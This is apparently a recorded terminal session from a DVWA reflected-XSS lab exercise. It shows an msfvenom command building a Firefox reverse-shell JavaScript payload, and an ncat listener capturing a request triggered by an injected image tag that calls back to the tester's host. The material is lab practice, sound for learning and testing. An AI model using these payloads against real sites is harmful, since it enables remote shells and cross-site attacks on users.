+[?2004l[?1l>[?25h[>4;m[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ rm js_rsh2.js 
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ rm js_rsh2.js [2@vim [C[C[C[C[C[C[C[C[C[C[C[Cless[C[C[C[C[C[C[C[C[C[C[C[Cmsfvenom -p firefox/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444  --format js_le -o js_rsh2.js[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnc -klvnp 8080[Kll[Knc -klvnp 8080
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+Ncat: Connection from 10.10.10.10.
+Ncat: Connection from 10.10.10.10:39474.
+GET /a.txt HTTP/1.1
+Host: 10.10.10.10:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://dvwa.local/vulnerabilities/xss_r/?name=as%3Cimg+src%3D%22http%3A%2F%2F10.10.10.10%3A8080%2Fa.txt%22+%2F%3E
+DNT: 1
+Connection: keep-alive
+
+^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ exit
+There are stopped jobs.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ll
+total 1784
+-rw-r--r-- 1 dinesh dinesh     184 Aug 31 15:20 01.session
+-rw-r--r-- 1 dinesh dinesh 1048576 Aug 31 17:33 01.session.data
+-rw-r--r-- 1 dinesh dinesh      16 Aug 31 17:40 01.session.lck
+-rw-r--r-- 1 dinesh dinesh 1524473 Aug 31 17:35 01.session.log
+-rw-r--r-- 1 dinesh dinesh     100 Aug 31 15:20 01.session.properties
+-rw-r--r-- 1 dinesh dinesh    6754 Aug 31 15:20 01.session.script
+drwxr-xr-x 2 dinesh dinesh    4096 Aug 31 15:20 [0m[01;34m01.session.tmp[0m
+-rw-r--r-- 1 dinesh dinesh  180224 Aug 31 17:08 terminal_log_Mon_31_Aug_2020_04:25:37_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ exit
+
+Script done on 2020-08-31 17:40:19+05:30 [COMMAND_EXIT_CODE="130"]
